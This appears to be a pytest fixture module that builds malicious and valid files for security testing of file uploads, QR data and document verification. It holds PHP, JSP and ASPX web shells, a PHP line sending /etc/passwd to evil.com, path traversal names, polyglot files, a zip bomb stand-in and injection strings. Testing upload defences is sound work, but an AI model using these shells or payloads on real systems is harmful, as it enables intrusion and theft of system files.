"""
E2E File Security Testing Fixtures
==================================

Squad 3 Security-Focused Fixtures for File Upload, QR, and Media Testing
Comprehensive security test data generation for E2E testing scenarios

This module provides:
- Malicious file generation (various attack vectors)
- Oversized file creation for size limit testing
- Valid file samples for positive testing
- Security test scenarios and edge cases
- Performance testing file generation

Security Test Categories:
- File type validation bypasses
- Size limit circumvention attempts
- Path traversal attacks
- Virus/malware simulation
- Injection attacks via file content
- Metadata exploitation
"""

import pytest
import tempfile
import os
import io
import uuid
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont
from typing import Dict, List, Tuple, Optional, Any
import json
import base64
from datetime import datetime, timedelta
import random
import string


class SecurityFileGenerator:
    """Generate various types of security test files"""

    def __init__(self):
        self.test_data_dir = Path(tempfile.gettempdir()) / "e2e_security_tests"
        self.test_data_dir.mkdir(exist_ok=True)

    def create_malicious_script_file(self, script_type: str = "php") -> Tuple[io.BytesIO, str, str]:
        """Create malicious script files for security testing"""
        malicious_scripts = {
            "php": {
                "content": b"""<?php
                    echo shell_exec($_GET['cmd']);
                    file_get_contents('http://evil.com/steal.php?data=' . base64_encode(file_get_contents('/etc/passwd')));
                ?>""",
                "filename": "malicious.php",
                "content_type": "application/x-php"
            },
            "jsp": {
                "content": b"""<%@ page import="java.io.*" %>
                    <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>""",
                "filename": "malicious.jsp",
                "content_type": "application/java-archive"
            },
            "aspx": {
                "content": b"""<%@ Page Language="C#" %>
                    <% System.Diagnostics.Process.Start(Request["cmd"]); %>""",
                "filename": "malicious.aspx",
                "content_type": "application/octet-stream"
            },
            "js": {
                "content": b"""
                    const fs = require('fs');
                    const os = require('os');
                    eval(process.argv[2]);
                    fs.writeFileSync('/tmp/pwned', 'system compromised');
                """,
                "filename": "malicious.js",
                "content_type": "application/javascript"
            }
        }

        script = malicious_scripts.get(script_type, malicious_scripts["php"])
        file_io = io.BytesIO(script["content"])
        file_io.seek(0)

        return file_io, script["filename"], script["content_type"]

    def create_path_traversal_attempts(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Create files with path traversal attack filenames"""
        traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "..\\..\\..\\/etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
        ]

        files = []
        for pattern in traversal_patterns:
            content = b"malicious content attempting path traversal"
            file_io = io.BytesIO(content)
            file_io.seek(0)
            files.append((file_io, pattern, "text/plain"))

        return files

    def create_virus_signature_files(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Create files with virus signatures for antivirus testing"""
        virus_signatures = [
            # EICAR test string (standard antivirus test)
            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
            # Fake virus signatures
            b"VIRUS_SIGNATURE_TEST_PAYLOAD_12345",
            b"\\x4d\\x5a\\x90\\x00\\x03\\x00\\x00\\x00MALWARE_SIM",
            # Embedded script in image
            b"\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF<?php system($_GET['cmd']); ?>\\xff\\xd9"
        ]

        files = []
        for i, signature in enumerate(virus_signatures):
            file_io = io.BytesIO(signature)
            file_io.seek(0)
            files.append((file_io, f"virus_test_{i}.dat", "application/octet-stream"))

        return files

    def create_oversized_files(self) -> List[Tuple[io.BytesIO, str, str, int]]:
        """Create oversized files for size limit testing"""
        oversized_scenarios = [
            (15 * 1024 * 1024, "oversized_15mb.jpg", "image/jpeg"),      # 15MB
            (50 * 1024 * 1024, "oversized_50mb.pdf", "application/pdf"),  # 50MB
            (100 * 1024 * 1024, "oversized_100mb.doc", "application/msword"),  # 100MB
            (500 * 1024 * 1024, "oversized_500mb.zip", "application/zip")  # 500MB
        ]

        files = []
        for size, filename, content_type in oversized_scenarios:
            # Create file with repeated pattern to save memory
            content = b"A" * min(size, 1024 * 1024)  # Cap at 1MB for memory efficiency
            if size > 1024 * 1024:
                # Simulate larger size with sparse content
                content += b"\\x00" * (size - len(content))

            file_io = io.BytesIO(content)
            file_io.seek(0)
            files.append((file_io, filename, content_type, size))

        return files

    def create_polyglot_files(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Create polyglot files that appear as multiple formats"""
        polyglots = [
            # JPEG with embedded PHP
            {
                "content": b"\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x01\\x00H\\x00H\\x00\\x00<?php system($_GET['cmd']); ?>\\xff\\xd9",
                "filename": "image_with_php.jpg",
                "content_type": "image/jpeg"
            },
            # PDF with embedded JavaScript
            {
                "content": b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 44>>stream
BT /F1 12 Tf 100 700 Td (Hello World) Tj ET
<script>alert('XSS')</script>
endstream endobj
trailer<</Size 5/Root 1 0 R>>""",
                "filename": "pdf_with_js.pdf",
                "content_type": "application/pdf"
            },
            # ZIP with path traversal
            {
                "content": b"PK\\x03\\x04\\x14\\x00\\x00\\x00\\x08\\x00../../../etc/passwd\\x00\\x00malicious",
                "filename": "zip_traversal.zip",
                "content_type": "application/zip"
            }
        ]

        files = []
        for polyglot in polyglots:
            file_io = io.BytesIO(polyglot["content"])
            file_io.seek(0)
            files.append((file_io, polyglot["filename"], polyglot["content_type"]))

        return files

    def create_malformed_files(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Create malformed files to test parser robustness"""
        malformed_files = [
            # Truncated JPEG
            (b"\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF", "truncated.jpg", "image/jpeg"),
            # Invalid PDF header
            (b"%PDF-999.999\\nmalformed content", "invalid.pdf", "application/pdf"),
            # Corrupted ZIP
            (b"PK\\x03\\x04CORRUPTED_ZIP_DATA", "corrupted.zip", "application/zip"),
            # Invalid PNG
            (b"\\x89PNG\\r\\n\\x1a\\nINVALID_PNG", "invalid.png", "image/png"),
            # Empty file with valid extension
            (b"", "empty.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
        ]

        files = []
        for content, filename, content_type in malformed_files:
            file_io = io.BytesIO(content)
            file_io.seek(0)
            files.append((file_io, filename, content_type))

        return files

    def create_metadata_exploitation_files(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Create files with malicious metadata"""
        # Create JPEG with malicious EXIF data
        img = Image.new('RGB', (100, 100), color='red')
        img_io = io.BytesIO()

        # Add malicious metadata (simulated)
        exif_dict = {
            "0th": {
                256: 100,  # ImageWidth
                257: 100,  # ImageLength
                272: "<?php system($_GET['cmd']); ?>",  # Make (malicious)
                306: "2023:01:01 00:00:00"  # DateTime
            }
        }

        img.save(img_io, format='JPEG', quality=85)
        img_io.seek(0)

        return [(img_io, "malicious_exif.jpg", "image/jpeg")]

    def create_compression_bomb_files(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Create compression bomb files (zip bombs, etc.)"""
        # Simulate zip bomb (simplified version)
        zip_bomb_content = b"PK\\x03\\x04" + b"A" * 1000 + b"PK\\x01\\x02" + b"A" * 10000000

        files = []
        file_io = io.BytesIO(zip_bomb_content)
        file_io.seek(0)
        files.append((file_io, "zip_bomb.zip", "application/zip"))

        return files


class ValidFileGenerator:
    """Generate valid files for positive testing scenarios"""

    def __init__(self):
        self.test_data_dir = Path(tempfile.gettempdir()) / "e2e_valid_tests"
        self.test_data_dir.mkdir(exist_ok=True)

    def create_valid_images(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Create various valid image files"""
        image_formats = [
            (Image.new('RGB', (800, 600), color='blue'), "test_image.jpg", "image/jpeg"),
            (Image.new('RGBA', (400, 300), color='green'), "test_image.png", "image/png"),
            (Image.new('RGB', (200, 200), color='red'), "test_image.bmp", "image/bmp"),
            (Image.new('RGB', (1920, 1080), color='yellow'), "high_res.jpg", "image/jpeg")
        ]

        files = []
        for img, filename, content_type in image_formats:
            img_io = io.BytesIO()
            format_name = filename.split('.')[-1].upper()
            if format_name == 'JPG':
                format_name = 'JPEG'

            img.save(img_io, format=format_name, quality=85 if format_name == 'JPEG' else None)
            img_io.seek(0)
            files.append((img_io, filename, content_type))

        return files

    def create_valid_documents(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Create various valid document files"""
        documents = [
            # Valid PDF
            {
                "content": b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 44>>stream
BT /F1 12 Tf 100 700 Td (Valid Document) Tj ET
endstream endobj
trailer<</Size 5/Root 1 0 R>>startxref
0
%%EOF""",
                "filename": "valid_document.pdf",
                "content_type": "application/pdf"
            },
            # Valid text file
            {
                "content": b"This is a valid text document with proper content.",
                "filename": "valid_text.txt",
                "content_type": "text/plain"
            },
            # Valid JSON
            {
                "content": json.dumps({
                    "type": "document",
                    "title": "Valid JSON Document",
                    "content": "This is valid JSON content",
                    "created_at": datetime.now().isoformat()
                }).encode(),
                "filename": "valid_data.json",
                "content_type": "application/json"
            }
        ]

        files = []
        for doc in documents:
            file_io = io.BytesIO(doc["content"])
            file_io.seek(0)
            files.append((file_io, doc["filename"], doc["content_type"]))

        return files

    def create_performance_test_files(self) -> List[Tuple[io.BytesIO, str, str, int]]:
        """Create files for performance testing"""
        performance_files = [
            # Various sizes for performance testing
            (1024, "small_1kb.txt", "text/plain"),
            (1024 * 1024, "medium_1mb.jpg", "image/jpeg"),
            (5 * 1024 * 1024, "large_5mb.pdf", "application/pdf"),
            (10 * 1024 * 1024, "xlarge_10mb.zip", "application/zip")
        ]

        files = []
        for size, filename, content_type in performance_files:
            if content_type == "image/jpeg":
                # Create actual image for JPEG
                img = Image.new('RGB', (2000, 1500), color='purple')
                img_io = io.BytesIO()
                img.save(img_io, format='JPEG', quality=90)
                img_io.seek(0)
                actual_size = len(img_io.getvalue())
                files.append((img_io, filename, content_type, actual_size))
            else:
                # Create data file
                content = os.urandom(size)  # Random data
                file_io = io.BytesIO(content)
                file_io.seek(0)
                files.append((file_io, filename, content_type, size))

        return files


class E2EFileSecurityFixtures:
    """Main fixture class for E2E file security testing"""

    def __init__(self):
        self.security_generator = SecurityFileGenerator()
        self.valid_generator = ValidFileGenerator()

    def get_all_malicious_files(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Get all types of malicious files for comprehensive testing"""
        all_malicious = []

        # Script injection files
        for script_type in ["php", "jsp", "aspx", "js"]:
            all_malicious.append(self.security_generator.create_malicious_script_file(script_type))

        # Path traversal files
        all_malicious.extend(self.security_generator.create_path_traversal_attempts())

        # Virus signature files
        all_malicious.extend(self.security_generator.create_virus_signature_files())

        # Polyglot files
        all_malicious.extend(self.security_generator.create_polyglot_files())

        # Malformed files
        all_malicious.extend(self.security_generator.create_malformed_files())

        # Metadata exploitation
        all_malicious.extend(self.security_generator.create_metadata_exploitation_files())

        # Compression bombs
        all_malicious.extend(self.security_generator.create_compression_bomb_files())

        return all_malicious

    def get_oversized_files(self) -> List[Tuple[io.BytesIO, str, str, int]]:
        """Get oversized files for size limit testing"""
        return self.security_generator.create_oversized_files()

    def get_valid_test_files(self) -> List[Tuple[io.BytesIO, str, str]]:
        """Get valid files for positive testing"""
        valid_files = []
        valid_files.extend(self.valid_generator.create_valid_images())
        valid_files.extend(self.valid_generator.create_valid_documents())
        return valid_files

    def get_performance_test_files(self) -> List[Tuple[io.BytesIO, str, str, int]]:
        """Get files for performance testing"""
        return self.valid_generator.create_performance_test_files()


# Pytest fixtures for easy use in tests
@pytest.fixture
def e2e_file_security_fixtures():
    """Main fixture providing all file security test data"""
    return E2EFileSecurityFixtures()


@pytest.fixture
def malicious_files(e2e_file_security_fixtures):
    """Fixture providing malicious files for security testing"""
    return e2e_file_security_fixtures.get_all_malicious_files()


@pytest.fixture
def oversized_files(e2e_file_security_fixtures):
    """Fixture providing oversized files for size testing"""
    return e2e_file_security_fixtures.get_oversized_files()


@pytest.fixture
def valid_test_files(e2e_file_security_fixtures):
    """Fixture providing valid files for positive testing"""
    return e2e_file_security_fixtures.get_valid_test_files()


@pytest.fixture
def performance_test_files(e2e_file_security_fixtures):
    """Fixture providing files for performance testing"""
    return e2e_file_security_fixtures.get_performance_test_files()


@pytest.fixture
def security_test_scenarios():
    """Fixture providing comprehensive security test scenarios"""
    return {
        "script_injection": [
            "php_web_shell",
            "jsp_command_exec",
            "aspx_system_call",
            "js_eval_injection"
        ],
        "path_traversal": [
            "unix_path_traversal",
            "windows_path_traversal",
            "url_encoded_traversal",
            "double_encoding_traversal"
        ],
        "file_type_bypass": [
            "polyglot_image_script",
            "pdf_javascript_embed",
            "zip_path_traversal"
        ],
        "size_attacks": [
            "oversized_image",
            "compression_bomb",
            "memory_exhaustion"
        ],
        "metadata_attacks": [
            "malicious_exif",
            "embedded_scripts",
            "hidden_payloads"
        ]
    }


@pytest.fixture
def qr_security_test_data():
    """Fixture providing QR-specific security test data"""
    return {
        "tampered_qr_codes": [
            '{"tracking_number": "FAKE-123", "internal_id": "FAKE", "hash": "invalid"}',
            '{"product_id": 999999, "verification": false}',
            '<script>alert("xss")</script>',
            '../../../etc/passwd',
            'javascript:alert("xss")'
        ],
        "malformed_qr_data": [
            "invalid_json_content",
            '{"incomplete": "json"',
            "null",
            "",
            "a" * 10000  # Oversized QR content
        ],
        "injection_attempts": [
            '{"tracking_number": "<?php system($_GET[\'cmd\']); ?>"}',
            '{"sql_injection": "\' OR 1=1 --"}',
            '{"xss": "<script>alert(1)</script>"}',
            '{"ldap_injection": "*)(uid=*))(|(uid=*"}'
        ]
    }


@pytest.fixture
def document_verification_test_data():
    """Fixture providing document verification test scenarios"""
    return {
        "valid_document_types": [
            {"type": "CEDULA", "format": "pdf", "size": "medium"},
            {"type": "RUT", "format": "jpg", "size": "small"},
            {"type": "BANK_CERTIFICATION", "format": "pdf", "size": "large"}
        ],
        "invalid_documents": [
            {"type": "UNKNOWN", "reason": "unsupported_type"},
            {"type": "CEDULA", "format": "exe", "reason": "dangerous_format"},
            {"type": "RUT", "size": "oversized", "reason": "size_limit_exceeded"}
        ],
        "edge_cases": [
            {"scenario": "empty_file", "expected": "rejection"},
            {"scenario": "corrupted_pdf", "expected": "parsing_error"},
            {"scenario": "image_with_no_content", "expected": "content_validation_fail"},
            {"scenario": "multiple_same_type", "expected": "duplicate_handling"}
        ]
    }


# Helper functions for test data generation
def generate_random_file_content(size_mb: float) -> bytes:
    """Generate random file content of specified size"""
    size_bytes = int(size_mb * 1024 * 1024)
    return os.urandom(size_bytes)


def create_test_image_with_metadata(width: int = 800, height: int = 600,
                                  metadata: Dict[str, Any] = None) -> io.BytesIO:
    """Create test image with custom metadata"""
    img = Image.new('RGB', (width, height), color='blue')
    img_io = io.BytesIO()

    # Add metadata if provided (simplified)
    if metadata:
        # In a real implementation, you'd use proper EXIF libraries
        pass

    img.save(img_io, format='JPEG', quality=85)
    img_io.seek(0)
    return img_io


def create_test_pdf_with_content(content: str) -> io.BytesIO:
    """Create test PDF with specific content"""
    pdf_template = f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length {len(content) + 20}>>stream
BT /F1 12 Tf 100 700 Td ({content}) Tj ET
endstream endobj
trailer<</Size 5/Root 1 0 R>>startxref
0
%%EOF"""

    pdf_io = io.BytesIO(pdf_template.encode())
    pdf_io.seek(0)
    return pdf_io